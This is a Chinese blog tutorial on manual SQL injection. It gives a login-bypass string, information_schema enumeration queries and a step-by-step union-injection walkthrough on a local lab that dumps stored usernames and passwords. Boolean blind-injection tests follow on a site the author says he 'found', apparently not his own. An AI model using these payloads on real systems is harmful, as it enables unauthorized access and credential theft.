<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="yes" name="apple-touch-fullscreen"><meta content="telephone=no,email=no" name="format-detection"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon"><link href="https://fonts.googleapis.com/css?family=Rubik" rel="stylesheet"><script src="https://use.fontawesome.com/adaf0e149c.js"></script><link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.6.0/styles/monokai_sublime.min.css"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/css/post.css"><link rel="stylesheet" href="/css/markdown-github.css"><title>zhang's blog</title><script src="/js/googleAnalytics.js"></script></head><body><div id="postContainer"><div id="postTop"><h4 id="logo">Life Is Short</h4><br><br><h2 id="postTitle">sql注入之手工注入基础</h2><br><span aria-hidden="true" class="postTime fa fa-calendar">2018-12-31</span><br><br></div><section id="articleDiv"><p>sql注入是最常见的一种漏洞，本次介绍手工注入及实战演练</p><br><h3 id="sql注入的两个条件"><a href="#sql注入的两个条件" class="headerlink" title="sql注入的两个条件"></a>sql注入的两个条件</h3><p>1.用户能控制输入的内容</p><br><p>2.web应用把用户输入的内容带到数据库中执行</p><br><h3 id="sql注入危害"><a href="#sql注入危害" class="headerlink" title="sql注入危害"></a>sql注入危害</h3><p>修改数据</p><br><p>获取数据</p><br><p>上传文件</p><br><p>读取文件</p><br><h3 id="sql注入万能密码"><a href="#sql注入万能密码" class="headerlink" title="sql注入万能密码"></a>sql注入万能密码</h3><p>‘or 1=1#</p><br><h3 id="sql注入，从代码角度来看"><a href="#sql注入，从代码角度来看" class="headerlink" title="sql注入，从代码角度来看:"></a>sql注入，从代码角度来看:</h3><p>分为数字型和字符型</p><br><p>又根据字符和数字可以外加()和字符能够使用双引号和单引号</p><br><p>1、select <em> from users where id = 1     纯数字型</em></p><br><p>2、select  from users where id = ‘1’   只加单引号</p><br><p>3、select <em> from users where id = “1”   指甲双引号</em></p><br><p>4、select  from users where (id = 1)   数字加括号</p><br><p>5、select <em> from users where (id = ‘1’) 双引号加括号</em></p><br><p>6、select  from users where (id = “1”) 单引号加括号</p><br><h3 id="从注入点的反馈类型可以分为"><a href="#从注入点的反馈类型可以分为" class="headerlink" title="从注入点的反馈类型可以分为:"></a>从注入点的反馈类型可以分为:</h3><p>union类型的注入</p><br><p>基于错误显示的注入</p><br><p>boolean盲注</p><br><p>时间盲注</p><br><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数:"></a>常用函数:</h3><p>limit  0,1  限制输出结果的行数</p><br><p>version()</p><br><p>user()</p><br><p>database()</p><br><p>group_concat()</p><br><p>string   -&gt;   hex<br>需要加0x<br>    ～   -&gt;   0x7e</p><br><p>order by 1       通过指定的列数，进行排序</p><br><p>union select  联合查询    需要注意，两边的内容列数一致。</p><br><p>DISTINCT</p><br><p>mysql中information_schema库存放所有的数据库信息，是公用的（任何用户都可以访问）</p><br><p>information_schema.SCHEMATA     表中schema_name字段存放了所有的数据库名字</p><br><p>information_schema.TABLES       表中table_name字段存放了所有的表名字，table_schema字段存储表所属的库名字</p><br><p>information_schema.COLUMNS      表column_name中存放了所有的字段名字，table_name字段存放了所属表的名字，table_schema字段存储表所属的库名字</p><br><p>查询数据库中有那些库select schema_name from information_schema.SCHEMATA</p><br><p>查询数据库中有那些表select table_name from information_schema.TABLES</p><br><p>查询数据库中test库中有哪些表select table_name from information_schema.TABLES where table_schema = ‘test’  // test 可以写成 0x7a73</p><br><p>查询数据库中有那些字段select column_name from information_schema.COLUMNS</p><br><p>查询数据库中test库中user表有哪些字段select column_name from information_schema.COLUMNS where table_schema = ‘test’ and table_name = ‘user’</p><br><p>知道了库的名字，表的名字，字段的名字，然后该干什么</p><br><p>猜解内容</p><br><p>select pass from test.user;</p><br><h3 id="进行快速测试"><a href="#进行快速测试" class="headerlink" title="进行快速测试"></a>进行快速测试</h3><p><img src="/2018/12/31/sql注入之手工注入基础/1.png" alt="1"></p><br><h3 id="一次union类型的注入的测试"><a href="#一次union类型的注入的测试" class="headerlink" title="一次union类型的注入的测试"></a>一次union类型的注入的测试</h3><p><a href="http://192.168.11.215:8003/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=1&#39;</a><br>出现问题，可能存在注入</p><br><p><a href="http://192.168.11.215:8003/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=1&#39;</a> %23<br>加%23后恢复正常，可以判断为’1’注入</p><br><p><a href="http://192.168.11.215:8003/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=1&#39;</a> order by 1 %23<br>使用order by 1   2   3   4  进行测试，发现查询的结果为3列，方便后续使用union select</p><br><p><a href="http://192.168.11.215:8003/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=1&#39;</a> union select 1,2,3 %23<br>发现页面不显示union select的内容，尝试使用limit或者是将前边的内容改为空</p><br><p><a href="http://192.168.11.215:8003/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=1&#39;</a> union select 1,2,3 limit 1,1 %23</p><br><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,2,3 %23<br>可以显示union select后的内容，2和3是显示结果的地方</p><br><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),database() %23<br>把2 和3  位改为user()和database()发现可以显示用户和数据库</p><br><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),(select group_concat(schema_name) from information_schema.SCHEMATA) %23</p><br><p>尝试直接将查询数据库的语句放入到3位，发现执行错误，尝试在sql语句两侧加入(),发现还是错误，再加入group_concat，返现正常查询出所有的数据库名字。</p><br><p>首先关于直接放sql语句，这个是不符合代码规范， 需要用()扩起来</p><br><p>加入group_concat恢复正常，是因为查询所有的库名字时，返回的结果是多行，而union select 的第3位，是只能写单行内容，所以用group_concat进行组合成一行。// information_schema,challenges,mysql,performance_schema,security</p><br><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),(select group_concat(table_name) from information_schema.TABLES where table_schema = ‘security’) %23<br>查询出security库中所有的表名</p><br><p>// emails,referers,uagents,users</p><br><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),(select group_concat(column_name) from information_schema.COLUMNS where table_schema = ‘security’ and table_name = ‘users’) %23        查询处security库中users表所有的字段名字</p><br><p>//  id,username,password</p><br><p>查询security库中users表中的数据<br><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),( select group_concat(id,0x7e,username,0x7e,password) from security.users ) %23</p><br><p>select group_concat(id,0x7e,username,0x7e,password) from security.users</p><br><p>~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~moble,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4</p><br><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),( select group_concat(<em>) from security.users ) %23直接出错，因为</em> 不能使用group_concat函数进行组合。</p><br><h3 id="一次基于boolean盲注的测试"><a href="#一次基于boolean盲注的测试" class="headerlink" title="一次基于boolean盲注的测试"></a>一次基于boolean盲注的测试</h3><p>1.我找到一个纯数字型注入的网站，然后开始盲注,数据库名长度大于11，没有报错<br><img src="/2018/12/31/sql注入之手工注入基础/2.png" alt="2"><br>2.大于12就报错<br><img src="/2018/12/31/sql注入之手工注入基础/3.png" alt="3"><br>3.于是数据库名字长度为12<br><img src="/2018/12/31/sql注入之手工注入基础/4.png" alt="4"><br>4.通过此方法，我发现数据库名第一个字符为ascii中的121，即y<br><img src="/2018/12/31/sql注入之手工注入基础/5.png" alt="5"><br>5.循环如此，便可找到数据库名，表名等信息。</p><br><h4 id="第二个boolean盲注的测试"><a href="#第二个boolean盲注的测试" class="headerlink" title="第二个boolean盲注的测试"></a>第二个boolean盲注的测试</h4><p>1.与上一个相似，也是为纯数字型注入的网站，然后开始盲注,数据库名长度为14.<br><img src="/2018/12/31/sql注入之手工注入基础/6.png" alt="6"><br>2.找数据库名的第一个字符，大于ascii的120，页面正常。<br><img src="/2018/12/31/sql注入之手工注入基础/7.png" alt="7"><br>3.数据库名的第一个字符，大于ascii的121，页面不正常。<br><img src="/2018/12/31/sql注入之手工注入基础/8.png" alt="8"><br>4.通过此方法，我发现数据库名第一个字符为ascii中的121，即y<br><img src="/2018/12/31/sql注入之手工注入基础/9.png" alt="9"><br>5.循环如此，便可找到数据库名，表名等信息。</p>
</section></div><script src="/js/jquery.min.js"></script><script src="/js/highlight.min.js"></script><script src="/js/start.js"></script></body></html>